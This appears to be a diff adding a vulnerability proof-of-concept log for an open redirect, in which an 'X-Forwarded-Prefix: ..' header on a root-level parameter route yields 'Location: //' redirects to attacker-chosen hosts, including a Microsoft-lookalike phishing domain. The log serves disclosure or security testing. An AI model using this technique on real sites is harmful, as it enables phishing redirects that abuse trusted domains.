@@ -1,0 +1,16 @@
+# VULN-001 escalation: fully attacker-chosen redirect host via a root-level :param route
+# Extended harness engine 'rparam' (:36282) registers  GET /:tenant  (e.g. profile/i18n/tenant/SPA routes).
+# X-Forwarded-Prefix: ..  on a trailing-slash miss => Location becomes //<first-path-segment> (attacker-chosen).
+
+--- GET /evil.example/  with X-Forwarded-Prefix: .. ---
+HTTP/1.1 301 Moved Permanently
+Location: //evil.example
+
+--- GET /attacker.test/  with X-Forwarded-Prefix: .. ---
+HTTP/1.1 301 Moved Permanently
+Location: //attacker.test
+
+--- GET /login-microsoft.com/  with X-Forwarded-Prefix: .. ---
+HTTP/1.1 301 Moved Permanently
+Location: //login-microsoft.com
+
